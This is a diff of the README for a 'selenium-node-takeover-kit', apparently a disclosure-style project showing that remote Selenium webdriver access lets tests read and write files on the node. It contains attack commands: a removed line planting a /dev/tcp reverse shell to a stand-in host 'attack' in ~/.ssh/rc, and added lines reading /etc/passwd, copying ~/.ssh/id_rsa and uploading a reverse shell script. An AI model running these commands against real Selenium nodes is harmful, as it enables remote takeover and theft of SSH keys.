@@ -1,19 +1,14 @@
 # selenium-node-takeover-kit
-A collection of selenium tests that might aid it takeover of a selenium node
+These examples are to demonstrate possible issues with Selenium’s current design and configuration.
 
-## upload_file.py 
-Example of adding a reverse shell on ssh login. 
+When a Selenium test interacts with a remote web driver, it can do the same things a user interacting with a local browser can do on the remote selenium node. Namely reading local files
 ```bash
-python3 examples/upload_file.py -u http://selenium-hub:4444/wd/hub -r ~/.ssh/rc -d "bash -c 'sh -i >& /dev/tcp/attack/4444 0>&1' &"
+examples/selenium_node_cat.py -u http://selenium-hub.lan:4444/wd/hub -r /etc/passwd
+examples/selenium_node_download.py -u http://selenium-hub.lan:4444/wd/hub -r ~/.ssh/id_rsa -l ./nodes_rsa
 ```
 
-## download_file.py
-Example of  concatenating the passwd file
+and writing local files
 ```bash
-python3 examples/download_file.py -u http://selenium-hub:4444/wd/hub -r /etc/passwd
+examples/selenium_node_upload.py -u http://selenium-hub.lan:4444/wd/hub -r ~/.ssh/rc -l ./reverse_shell.sh
 ```
-
-Example of downloading a small file
-```bash
-python3 examples/download_file.py -u http://selenium-hub:4444/wd/hub -r /bin/ls -l ./test_ls
-```
+in the context of the running service. I believe these abilities should be something that can be turned off, and turned off by default.
